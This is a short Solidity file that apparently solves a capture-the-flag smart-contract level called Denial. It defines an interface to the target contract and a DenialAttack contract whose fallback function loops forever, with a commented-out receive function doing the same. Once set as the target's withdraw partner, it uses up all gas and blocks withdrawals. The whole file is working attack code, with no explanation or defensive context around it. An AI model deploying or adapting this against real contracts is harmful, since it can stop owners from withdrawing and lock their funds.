// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Denial {
    receive() external payable;
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function contractBalance() external view returns (uint256);
}

contract DenialAttack {
/*
    receive () external payable {
        while (true) {}
    }
*/
    fallback () external payable {
        while (true) {}
    }
}
